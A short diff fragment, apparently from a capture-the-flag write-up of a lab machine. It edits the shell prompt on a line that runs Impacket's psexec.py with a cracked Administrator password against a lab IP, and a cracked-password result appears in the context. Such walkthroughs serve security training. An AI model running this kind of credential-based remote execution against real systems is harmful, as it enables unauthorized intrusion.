@@ -316,7 +316,7 @@ Candidates.#1....: Tioncurtis23 -> Thelittlemermaid
 And we're in...
 
 ```
-nostromo :: code/hacker/scratch » sudo psexec.py active/Administrator:Ticketmaster1968@10.10.10.100                            1 ↵
+» sudo psexec.py active/Administrator:Ticketmaster1968@10.10.10.100                            1 ↵
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 [*] Requesting shares on 10.10.10.100.....
